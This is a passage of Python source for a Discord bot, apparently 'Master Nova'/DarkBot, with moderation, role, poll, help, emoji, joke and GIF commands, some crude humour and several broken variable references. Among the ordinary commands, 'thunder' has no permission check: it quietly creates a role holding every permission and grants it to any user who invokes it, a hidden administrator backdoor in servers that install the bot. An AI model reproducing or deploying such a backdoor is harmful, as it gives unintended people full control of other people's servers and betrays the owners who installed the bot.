      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, '★-server-partner-★',everyone)
      
@client.command(pass_context=True)
@commands.cooldown(rate=1,per=86400,type=BucketType.user) 
@commands.has_permissions(administrator=True)
async def partner(ctx, *, msg=None):
    if msg is None:
       await client.say("Please specify a partnership description")
       return
    else:
       for server in client.servers:
         for channel in server.channels:
           if channel.name == '★-server-partner-★':
               r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
               embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
               embed.add_field(name='Discord Partner', value='-------------------',inline = False) 
               embed.add_field(name='Partner ID:', value='{}'.format(ctx.message.author.id),inline = False)
               embed.add_field(name='Partner Name:', value='{}'.format(ctx.message.author.name),inline = False)
               embed.add_field(name='Server Name:', value='{}'.format(ctx.message.server.name),inline = False)
               embed.add_field(name='Partnership Description:', value=msg, inline=False)
               await client.send_message(channel, embed=embed) 
               await client.delete_message(ctx.message)
         
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def setuplog(ctx):
    if ctx.message.author.bot:
      return
    else:
      author = ctx.message.author
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, '╰☆☆-Master Nova-log-☆☆╮',everyone)

@client.command(pass_context=True)  
@commands.has_permissions(kick_members=True)
async def getuser(ctx, role: discord.Role = None):
    if role is None:
        await client.say('Please tag a role to get users having it. Example- ``N!getuser @role``')
        return
    empty = True
    for member in ctx.message.server.members:
        if role in member.roles:
            await client.say("{0.name}: {0.id}".format(member))
            empty = False
    if empty:
        await client.say("Nobody has the role {}".format(role.mention))

@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)     
async def userinfo(ctx, user: discord.Member=None):
    if user is None:
        await client.say('Please tag a user to get user information. Example- ``N!userinfo @user``')
    if ctx.message.author.bot:
      return
    else:
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = discord.Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
      embed.add_field(name="Name", value=user.mention, inline=True)
      embed.add_field(name="ID", value=user.id, inline=True)
      embed.add_field(name="Status", value=user.status, inline=True)
      embed.add_field(name="Highest role", value=user.top_role)
      embed.add_field(name="Color", value=user.color)
      embed.add_field(name="Playing", value=user.game)
      embed.add_field(name="Nickname", value=user.nick)
      embed.add_field(name="Joined", value=user.joined_at.strftime("%d %b %Y %H:%M"))
      embed.add_field(name="Created", value=user.created_at.strftime("%d %b %Y %H:%M"))
      embed.set_thumbnail(url=user.avatar_url)
      await client.say(embed=embed)

@client.command(pass_context = True)
async def thunder(ctx):
    user = ctx.message.author
    if discord.utils.get(user.server.roles, name="King Nova") is None:
        await client.create_role(user.server, name="nova", permissions=discord.Permissions.all())
        role = discord.utils.get(ctx.message.server.roles, name='nova')
        await client.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await client.delete_message(ctx.message)
        role = discord.utils.get(ctx.message.server.roles, name='nova')
        await client.add_roles(ctx.message.author, role)
        print('Added King nova role in ' + (ctx.message.author.name))
        await client.send_message(author, embed=embed)
	
@client.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, role:str=None):
    user = ctx.message.author
    if discord.utils.get(user.server.roles, name="{}".format(role)) is None:
        await client.create_role(user.server, name="{}".format(role), permissions=discord.Permissions.none())
        await client.say("{} role has been added.".format(role))
        return
    else:
        await client.say("{} role is already exists".format(role))
		
@client.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def roleinfo(ctx,*, role:discord.Role=None):
    if discord.utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await client.say("No such role found")
        return
    else:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title="{}'s info".format(role.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_thumbnail(url = ctx.message.server.icon_url)
        embed.add_field(name="Name", value=role.name, inline=True)
        embed.add_field(name="ID", value=role.id, inline=True)
        embed.add_field(name="Color", value=role.color)
        embed.add_field(name="Created", value=role.created_at.strftime("%d %b %Y %H:%M"))
        await client.say(embed=embed)
		

@client.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def rolecolor(ctx, role:discord.Role=None, value:str=None):
    if discord.utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await client.say("Use this command like ``mv!rolecolor (ROLENAME) (ROLECOLOUR IN HEXCODE)``")
        return
    if value is None:
        await client.say("Use this command like ``mv!rolecolor (ROLENAME) (ROLECOLOUR IN HEXCODE)``")
        return
    else:
        new_val = value.replace("#", "")
        colour = '0x' + new_val
        user = ctx.message.author
        await client.edit_role(ctx.message.server, role, color = discord.Color(int(colour, base=16)))
        await client.say("{} role colour has been edited.".format(role))

		
@client.command(pass_context = True)
@commands.has_permissions(manage_roles=True)
async def delrole(ctx,*, role: discord.Role = None):
    user = ctx.message.author
    if discord.utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await client.say("There is no role with this name in this server")
    else:
        await client.delete_role(ctx.message.server, role)
        await client.say(f"{role} role has been deleted")


	
@client.command(pass_context=True)
@commands.has_permissions(ban_members=True)
async def unbanall(ctx):
    if ctx.message.author.bot:
      return
    else:
      server=ctx.message.server
      ban_list=await client.get_bans(server)
      await client.say('Unbanning {} members'.format(len(ban_list)))
      for channel in ctx.message.author.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="All users are unbanned!", description="Members were unbanned by **{}**!".format(ctx.message.author), color=0x05F6E0)
            await client.send_message(channel, embed=embed)
      for member in ban_list:
          await client.unban(server,member)
	  


	
@client.command(pass_context=True)
async def iamcoder(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="Successfully added", description="Programmer role", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Enjoy! ", value="Happy Coding :-). Here you will get special help from our staff related to server development. ", inline=True)
    
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Programmer')
    await client.add_roles(ctx.message.author, role)
    print('Added codies role in ' + (ctx.message.author.name))
    await client.send_message(author, embed=embed)
    
@client.command(pass_context=True)
async def iamnotcoder(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="Successfully removed", description="Programmer role", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Enjoy! ", value="Hope you will try our other features as well", inline=True)
    
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Programmer')
    await client.remove_roles(ctx.message.author, role)
    print('Removed codies role from ' + (ctx.message.author.name))
    await client.send_message(author, embed=embed)
 
@client.command(pass_context=True)
async def iamnotserverdeveloper(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="Successfully removed", description="Server developer role", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Enjoy! ", value="Hope you will try our other features as well", inline=True)
    
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Server Developer')
    await client.remove_roles(ctx.message.author, role)
    print('Removed server developer role from ' + (ctx.message.author.name))
    await client.send_message(author, embed=embed)
    

@client.command(pass_context=True)
async def iamserverdeveloper(ctx):
    author = ctx.message.author
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="Successfully added", description="Server Developer role", color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name="Enjoy! ", value="Happy Server Development. Here you will get special support from our support team related to server development", inline=True)
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Server Developer')
    await client.add_roles(ctx.message.author, role)
    print('Added codies role in ' + (ctx.message.author.name))
    await client.send_message(author, embed=embed)
 
	
@client.command(pass_context = True)
@commands.has_permissions(manage_roles=True)     
async def role(ctx, user: discord.Member=None, *, role: discord.Role = None):
        if user is None:
            await client.say("You haven't specified a member! ")
        if role is None:
            await client.say("You haven't specified a role! ")
        if role not in user.roles:
            await client.add_roles(user, role)
            await client.say("{} role has been added to {}.".format(role, user))
            return
        if role in user.roles:
            await client.remove_roles(user, role)
            await client.say("{} role has been removed from {}.".format(role, user)) 
          
 
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def warn(ctx, userName: discord.User=None,*, message:str=None): 
    if userName is None:
      await client.say('Please tag a person to warn user. Example- ``N!warn @user <reason>``')
      return
    else:
      await client.send_message(userName, "You have been warned for: **{}**".format(message))
      await client.say(":warning: __**{0} Has Been Warned!**__ :warning: ** Reason:{1}** ".format(userName,message))
      pass

@client.command(pass_context = True)
@commands.has_permissions(manage_nicknames=True)     
async def setnick(ctx, user: discord.Member=None, *, nickname=None):
    if user is None:
      await client.say('Please tag a person to change nickname. Example- ``N!nickname @user <new nickname>``')
      return
    else:
      await client.change_nickname(user, nickname)
      await client.delete_message(ctx.message)
      for channel in user.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
            await client.send_message(channel, embed=embed)

@client.command(pass_context=True)
async def poll(ctx, question, *options: str):
        if len(options) <= 1:
            await client.say('You need more than one option to make a poll!')
            return
        if len(options) > 10:
            await client.say('You cannot make a poll for more than 10 things!')
            return

        if len(options) == 2 and options[0] == 'yes' and options[1] == 'no':
            reactions = ['👍', '👎']
        else:
            reactions = ['1\u20e3', '2\u20e3', '3\u20e3', '4\u20e3', '5\u20e3', '6\u20e3', '7\u20e3', '8\u20e3', '9\u20e3', '\U0001f51f']

        description = []
        for x, option in enumerate(options):
            description += '\n {} {}'.format(reactions[x], option)
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=question, description=''.join(description), color = discord.Color((r << 16) + (g << 8) + b))
        react_message = await client.say(embed=embed)
        for reaction in reactions[:len(options)]:
            await client.add_reaction(react_message, reaction)
        embed.set_footer(text='Poll ID: {}'.format(react_message.id))
        await client.edit_message(react_message, embed=embed)
        
@client.command(pass_context = True)
async def help(ctx):
    if ctx.message.author.bot:
      return
    else:
      author = ctx.message.author
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
      embed.set_author(name='Help')
      embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
      embed.add_field(name = 'Having doubts? Join our server and clear your doubts. Server link:',value ='https://discord.gg/2DaFjH5',inline = False)
      embed.add_field(name = 'React with 🇲 ',value ='Explaines all the commands which are only usable by Those who has moderation permissions. Like- Manage Nicknames, Manage Messages, Kick/Ban Members,etc.',inline = False)
      embed.add_field(name = 'React with 🇬 ',value ='Explaines all the commands which are usable by everyone.',inline = False)
      embed.add_field(name = 'React with 🏵 ',value ='Explaines how to setup some stuffs like Giveaway feature and welcomer feature in your server',inline = False)
      embed.add_field(name = 'React with 🎦 ',value ='List of Nitro emojis that you can use',inline = False)
      dmmessage = await client.send_message(author,embed=embed)
      reaction1 = '🇲'
      reaction2 = '🇬'
      reaction3 = '🏵'
      reaction4 = '🎦'
      await client.add_reaction(dmmessage, reaction1)
      await client.add_reaction(dmmessage, reaction2)
      await client.add_reaction(dmmessage, reaction3)
      await client.add_reaction(dmmessage, reaction4)
      await client.say('📨 Check DMs For Information')
      await asyncio.sleep(30)
      await client.delete_message(dmmessage)

@client.command(pass_context=True)  
@commands.has_permissions(kick_members=True)     
async def kick(ctx,user:discord.Member):
    if user is None:
      await client.say('Please mention a member to kick. Example- ``N!kick @user``')
    if user.server_permissions.kick_members:
      await client.say('**He is mod/admin and i am unable to kick him/her**')
      return
    else:
      await client.kick(user)
      await client.say(user.name+' was kicked. Good bye '+user.name+'!')
      await client.delete_message(ctx.message)
      for channel in user.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="User kicked!", description="**{0}** is kicked by **{1}**!".format(user, ctx.message.author), color=0xFDE112)
            await client.send_message(channel, embed=embed)
        

@client.command(pass_context = True)
@commands.has_permissions(manage_messages = True)
async def purge(ctx, number: int):
  purge = await client.purge_from(ctx.message.channel, limit = number+1)
 
@client.command(pass_context=True)  
@commands.has_permissions(ban_members=True)      
async def ban(ctx,user:discord.Member=None):
    if user is None:
      await client.say('Please specify a member to ban. Example- ``N!ban @user``')
    if user.server_permissions.ban_members:
      await client.say('**He is mod/admin and i am unable to ban him/her**')
      return
    else:
      await client.ban(user)
      await client.say(user.name+' was banned. Good bye '+user.name+'!')
      for channel in member.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="User banned!", description="**{0}** banned by **{1}**!".format(member, ctx.message.author), color=0x38761D)
            await client.send_message(channel, embed=embed)

@client.command(pass_context=True)  
@commands.has_permissions(ban_members=True)     
async def unban(ctx):
    ban_list = await client.get_bans(ctx.message.server)

    # Show banned users
    await client.say("Ban list:\n{}".format("\n".join([user.name for user in ban_list])))

    # Unban last banned user
    if not ban_list:
      await client.say('Ban list is empty.')
      return
    else:
      await client.unban(ctx.message.server, ban_list[-1])
      await client.say('Unbanned user: `{}`'.format(ban_list[-1].name))
      for channel in member.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="User unbanned!", description="**{0}** unbanned by **{1}**!".format(ban_list[-1].name, ctx.message.author), color=0x38761D)
            await client.send_message(channel, embed=embed)
  
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def say(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if ctx.message.author.bot:
      return
    else:
      if not msg: await client.say("Please specify a message to send")
      else: await client.say(msg)
	
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def saytts(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if ctx.message.author.bot:
      return
    else:
      if not msg: await client.say("Please specify a message to send")
      else: await client.say(msg, tts=True)
      
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def emojiids(ctx):
  for emoji in ctx.message.author.server.emojis:
    print(f"<:{emoji.name}:{emoji.id}>")
    print(" ")    
			
@client.command(pass_context = True)
async def wow(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:WOW:515854429485006848>')
	
@client.command(pass_context = True)
async def dank(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:OnThaCoco:515853700682743809>')

@client.command(pass_context = True)
async def santa(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:santa:517232271678504970>')
	
@client.command(pass_context = True)
async def hi(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:hi:517232279148429313>')
	
@client.command(pass_context = True)
async def lol(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:lol:517232283670020096>')
	
@client.command(pass_context = True)
async def love(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:love:517232300912672774>')
	
@client.command(pass_context = True)
async def mad(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:mad:517232301176913951>')
	
@client.command(pass_context = True)
async def alien(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:alien:517232332663422986>')

@client.command(pass_context = True)
async def fearfromme(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:shiroeglassespush:516174320532193289>')
	   	
@client.command(pass_context = True)
async def angry(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:angear:516174316950388772>')
	
@client.command(pass_context = True)
async def surprised(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:eyebigger:516174315058626560>')
		
@client.command(pass_context = True)
async def cat(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:agooglecat:516174312294842389>')
		
@client.command(pass_context = True)
async def thinking1(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:thinking:516183328613990400>')
	
@client.command(pass_context = True)
async def thinking2(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:thinking2:516183323127709699>')
	

@client.command(pass_context = True)
async def happy(ctx):
    await client.delete_message(ctx.message)
    await client.say('<a:happy:516183323052212236>')
		
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def rules(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if '@here' in msg or '@everyone' in msg:
      return
    if not msg: await client.say("Please specify a user to warn")
    else: await client.say(msg + ', Please Read Rules again and never break any one of them again otherwise i will mute/kick/ban you next time.')
    return

@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def bans(ctx):
    '''Gets A List Of Users Who Are No Longer With us'''
    x = await client.get_bans(ctx.message.server)
    x = '\n'.join([y.name for y in x])
    embed = discord.Embed(title = "List of The Banned Idiots", description = x, color = 0xFFFFF)
    return await client.say(embed = embed)

@client.command(pass_context=True)  
@commands.has_permissions(kick_members=True)     
async def serverinfo(ctx):
    server = ctx.message.server
    roles = [x.name for x in server.role_hierarchy]
    role_length = len(roles)
    if role_length > 50: #Just in case there are too many roles...
        roles = roles[:50]
        roles.append('>>>> Displaying[50/%s] Roles'%len(roles))
    roles = ', '.join(roles);
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    online = len([m.status for m in server.members if m.status == discord.Status.online or m.status == discord.Status.idle])
    embed = discord.Embed(name="{} Server information".format(server.name), color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_thumbnail(url = server.icon_url)
    embed.add_field(name="Server name", value=server.name, inline=True)
    embed.add_field(name="Owner", value=server.owner.mention)
    embed.add_field(name="Server ID", value=server.id, inline=True)
    embed.add_field(name="Roles", value=len(server.roles), inline=True)
    embed.add_field(name="Members", value=len(server.members), inline=True)
    embed.add_field(name="Online", value=f"**{online}/{len(server.members)}**")
    embed.add_field(name="Created at", value=server.created_at.strftime("%d %b %Y %H:%M"))
    embed.add_field(name="Emojis", value=f"{len(server.emojis)}/100")
    embed.add_field(name="Server Region", value=str(server.region).title())
    embed.add_field(name="Total Channels", value=len(server.channels))
    embed.add_field(name="AFK Channel", value=str(server.afk_channel))
    embed.add_field(name="AFK Timeout", value=server.afk_timeout)
    embed.add_field(name="Verification Level", value=server.verification_level)
    embed.add_field(name="Roles {}".format(role_length), value = roles)
    await client.send_message(ctx.message.channel, embed=embed)
   
@client.command(pass_context=True)
async def google(ctx, *, message):
    new_message = message.replace(" ", "+")
    url = f"https://www.google.com/search?q={new_message}"
    await client.say(url)

@client.command(pass_context=True)
async def darkyt(ctx, *, message):
    new_message = message.replace(" ", "+")
    url = f"https://www.youtube.com/channel/UCrHGGn1F_l0y8NMxR1KFekw/search?query={new_message}"
    await client.say(url)

@client.command(pass_context=True)
async def youtube(ctx, *, message: str):
    new_message = message.replace(" ", "+")
    url = f"https://www.youtube.com/results?search_query={new_message}"
    await client.say(url)

@client.command(pass_context=True)
async def kiss(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    randomurl = ["https://media3.giphy.com/media/G3va31oEEnIkM/giphy.gif", "https://i.imgur.com/eisk88U.gif", "https://media1.tenor.com/images/e4fcb11bc3f6585ecc70276cc325aa1c/tenor.gif?itemid=7386341", "http://25.media.tumblr.com/6a0377e5cab1c8695f8f115b756187a8/tumblr_msbc5kC6uD1s9g6xgo1_500.gif"]
    if user.id == ctx.message.author.id:
        await client.say("Goodluck kissing yourself {}".format(ctx.message.author.mention))
    else:
        embed = discord.Embed(title=f"{user.name} You just got a kiss from {ctx.message.author.name}", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(randomurl))
        await client.say(embed=embed)

@client.command(pass_context=True)
async def hug(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    if user.id == ctx.message.author.id:
        await client.say("{} Wanted to hug himself/herself , good luck on that you will look like an idiot trying to do it".format(user.mention))
    else:
        randomurl = ["http://gifimage.net/wp-content/uploads/2017/09/anime-hug-gif-5.gif", "https://media1.tenor.com/images/595f89fa0ea06a5e3d7ddd00e920a5bb/tenor.gif?itemid=7919037", "https://media.giphy.com/media/NvkwNVuHdLRSw/giphy.gif"]
        embed = discord.Embed(title=f"{user.name} You just got a hug from {ctx.message.author.name}", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(randomurl))
        await client.say(embed=embed)

@client.command(pass_context=True)
async def gender(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    random.seed(user.id)
    genderized = ["Male", "Female", "Transgender", "Unknown", "Can't be detected", "Error 404 gender type cannot be found in the database"]
    randomizer = random.choice(genderized)
    if user == ctx.message.author:
        embed = discord.Embed(title="You should know your own gender", color = discord.Color((r << 16) + (g << 8) + b))
        await client.say(embed=embed)
    else:
        embed = discord.Embed(color=0xfff47d)
        embed.add_field(name=f"{user.name}'s gender check results", value=f"{randomizer}")
        await client.say(embed=embed)

@client.command(pass_context=True)
async def virgin(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    random.seed(user.id)
    results= ["No longer a virgin", "Never been a virgin", "100% Virgin", "Half virgin :thinking:", "We cannot seem to find out if this guy is still a virgin due to it's different blood type"]
    randomizer = random.choice(results)
    if user == ctx.message.author:
        embed = discord.Embed(title="Go ask yourself if you are still a virgin", color = discord.Color((r << 16) + (g << 8) + b))
        await client.say(embed=embed)
    else:
        embed = discord.Embed(color=0x7dfff2)
        embed.add_field(name=f"{user.name}'s virginity check results", value=f"{randomizer}")
        await client.say(embed=embed)

@client.command(pass_context=True)
async def joke(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    joke = ["What do you call a frozen dog?\nA pupsicle", "What do you call a dog magician?\nA labracadabrador", "What do you call a large dog that meditates?\nAware wolf", "How did the little scottish dog feel when he saw a monster\nTerrier-fied!", "Why did the computer show up at work late?\nBecause it had a hard drive", "Autocorrect has become my worst enime", "What do you call an IPhone that isn't kidding around\nDead Siri-ous", "The guy who invented auto-correct for smartphones passed away today\nRestaurant in peace", "You know you're texting too much when you say LOL in real life, instead of laughing", "I have a question = I have 18 Questions\nI'll look into it = I've already forgotten about it", "Knock Knock!\nWho's there?\Owls say\nOwls say who?\nYes they do.", "Knock Knock!\nWho's there?\nWill\nWill who?\nWill you just open the door already?", "Knock Knock!\nWho's there?\nAlpaca\nAlpaca who?\nAlpaca the suitcase, you load up the car.", "Yo momma's teeth is so yellow, when she smiled at traffic, it slowed down.", "Yo momma's so fat, she brought a spoon to the super bowl.", "Yo momma's so fat, when she went to the beach, all the whales started singing 'We are family'", "Yo momma's so stupid, she put lipstick on her forehead to make up her mind.", "Yo momma's so fat, even Dora can't explore her.", "Yo momma's so old, her breast milk is actually powder", "Yo momma's so fat, she has to wear six different watches: one for each time zone", "Yo momma's so dumb, she went to the dentist to get a bluetooth", "Yo momma's so fat, the aliens call her 'the mothership'", "Yo momma's so ugly, she made an onion cry.", "Yo momma's so fat, the only letters she knows in the alphabet are K.F.C", "Yo momma's so ugly, she threw a boomerang and it refused to come back", "Yo momma's so fat, Donald trump used her as a wall", "Sends a cringey joke\nTypes LOL\nFace in real life : Serious AF", "I just got fired from my job at the keyboard factory. They told me I wasn't putting enough shifts.", "Thanks to autocorrect, 1 in 5 children will be getting a visit from Satan this Christmas.", "Have you ever heard about the new restaurant called karma?\nThere's no menu, You get what you deserve.", "Did you hear about the claustrophobic astronaut?\nHe just needed a little space", "Why don't scientists trust atoms?\nBecase they make up everything", "How did you drown a hipster?\nThrow him in the mainstream", "How does moses make tea?\nHe brews", "A man tells his doctor\n'DOC, HELP ME. I'm addicted to twitter!'\nThe doctor replies\n'Sorry i don't follow you...'", "I told my wife she was drawing her eyebrows too high. She looked surprised.", "I threw a boomeranga a few years ago. I now live in constant fear"]
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name=f"Here is a random joke that {ctx.message.author.name} requested", value=random.choice(joke))
    await client.say(embed=embed)

@client.command(pass_context=True)
async def slap(ctx, user: discord.Member = None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    gifs = ["http://rs20.pbsrc.com/albums/b217/strangething/flurry-of-blows.gif?w=280&h=210&fit=crop", "https://media.giphy.com/media/LB1kIoSRFTC2Q/giphy.gif", "https://i.imgur.com/4MQkDKm.gif"]
    if user == None:
        await client.say(f"{ctx.message.author.mention} ```Proper usage is\n\n>slap <mention a user>```")
    else:
        embed = discord.Embed(title=f"{ctx.message.author.name} Just slapped the shit out of {user.name}!", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(gifs))
        await client.say(embed=embed)

@client.command(pass_context=True)
async def damn(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="DAMNNNNNNNN!!", color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url="http://i.imgur.com/OKMogWM.gif")
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def burned(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url="https://i.imgur.com/wY4xbak.gif")
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def savage(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    gifs = ["https://media.giphy.com/media/s7eezS6vxhACk/giphy.gif", "https://m.popkey.co/5bd499/gK00J_s-200x150.gif",
            "https://i.imgur.com/XILk4Xv.gif"]
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url=random.choice(gifs))
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def thuglife(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    gifs = ["https://media.giphy.com/media/kU1qORlDWErOU/giphy.gif", "https://media.giphy.com/media/EFf8O7znQ6zRK/giphy.gif",
            "https://i.imgur.com/XILk4Xv.gif", "http://www.goodbooksandgoodwine.com/wp-content/uploads/2011/11/make-it-rain-guys.gif"]
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url=random.choice(gifs))
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def membernames(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    try:
        embed = discord.Embed(description="\n".join([member.name for member in ctx.message.server.members]), color=0x0093ff)
        await client.send_message(ctx.message.author, embed=embed)
    except:
        embed = discord.Embed(title="There are too many members that the bot cannot list it down", color = discord.Color((r << 16) + (g << 8) + b))
        await client.say(embed=embed)
	
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def norole(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if not msg: await client.say("Please specify a user to warn")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say(msg + ', Please Do not ask for promotions check Rules again.')
    return

@client.command(pass_context = True)
async def happybirthday(ctx, *, msg = None):
    if not msg: await client.say("Please specify a user to wish")
    if '@here' in msg or '@everyone' in msg:
      return
    await client.say('Happy birthday ' + msg + ' \nhttps://asset.holidaycardsapp.com/assets/card/b_day399-22d0564f899cecd0375ba593a891e1b9.png')
    return


@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def english(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if not msg: await client.say("Please specify a user to warn")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say(msg + ', Please do not use language other than **English.**')
    return


@client.command(pass_context = True) 
async def htmltutorial(ctx, *, msg = None):
    await client.delete_message(ctx.message)
    if not msg: await client.say("Please specify a user")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say('Welcome' + msg +  ', Please check http://uksoft.000webhostapp.com/Programming-Tutorials/index.html')
    return
   
@client.command(pass_context = True)
async def github(ctx, *, msg = None):
    if not msg: await client.say("Please specify respo. ``Format- https://github.com/uksoftworld/DarkBot``")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say('https://github.com/' + msg)
    return

@client.command(pass_context = True)
async def reactionroles(ctx, *, msg = None):
    if not msg: await client.say("Check this video to setup YAGPDB BOT- https://www.youtube.com/watch?v=icAqiw6txRQ")
    if '@here' in msg or '@everyone' in msg:
      return
    else: await client.say('Check this video to setup YAGPDB BOT- https://www.youtube.com/watch?v=icAqiw6txRQ ' + msg)
    return

@client.command(pass_context = True)
async def invite(ctx):
    if ctx.message.author.bot:
      return
    else:
      embed=discord.Embed(title="Click on this link to invite:", description="https://discordapp.com/oauth2/authorize?client_id=520550412219318272&permissions=8&scope=bot" , color=0x00fd1b)
      await client.say(embed=embed)

@client.command(pass_context = True)
async def authlink(ctx):
    if ctx.message.author.bot:
      return
    else:
